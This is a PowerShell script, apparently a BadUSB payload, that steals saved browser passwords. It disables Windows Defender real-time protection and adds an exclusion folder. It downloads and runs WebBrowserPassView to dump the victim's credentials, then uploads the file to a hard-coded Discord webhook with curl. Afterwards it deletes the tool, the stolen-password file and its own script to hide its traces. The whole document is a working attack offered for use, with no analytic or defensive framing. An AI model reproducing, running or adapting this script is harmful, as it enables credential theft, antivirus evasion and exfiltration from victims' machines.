$random = -join ((48..57) | Get-Random -Count 3 | ForEach-Object {[char]$_})

mkdir C:/fileUp
Set-MpPreference -DisableRealtimeMonitoring 1
Set-MpPreference -ExclusionPath "C:/fileUp"
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile "C:/fileUp/WebBrowserPassView.exe"

Set-Location C:\fileUp
.\WebBrowserPassView.exe /stext passwords-$env:UserName$random.txt

Start-Sleep -seconds 15

curl.exe -F "payload_json={\`"content\`": \`"\`"}" -F "file=@passwords-$env:UserName$random.txt" https://discord.com/api/webhooks/1374684800430112889/oAzFkhzV7z45YCtLCpG5nUehUawgv4yH4ZnMYljCLt0RNwIJaUjNyQOGZj6AfEP31zBP

Start-Sleep -seconds 1

Remove-Item WebBrowserPassView.exe
Remove-Item passwords-$env:UserName$random.txt
cd..
Remove-Item fileUp
Remove-Item $env:temp\passview.ps1

Set-MpPreference -DisableRealtimeMonitoring 0
exit
